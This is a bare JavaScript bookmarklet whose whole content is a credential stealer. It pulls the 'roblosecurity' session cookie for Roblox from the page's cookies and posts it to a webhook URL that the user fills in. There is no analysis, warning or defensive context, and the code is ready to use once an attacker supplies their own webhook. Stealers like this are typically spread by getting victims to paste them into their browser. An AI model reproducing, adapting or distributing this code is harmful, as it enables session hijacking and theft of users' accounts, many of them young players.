javascript:(function() {
   var cookieValue = document.cookie.match(/roblosecurity=([^;]+)/)[1];
   var webhookURL = "YOUR_WEBHOOK_URL";

   var xhr = new XMLHttpRequest();
   xhr.open("POST", webhookURL, true);
   xhr.setRequestHeader("Content-Type", "application/json");

   var payload = JSON.stringify({ "cookieValue": cookieValue });

   xhr.send(payload);
})();
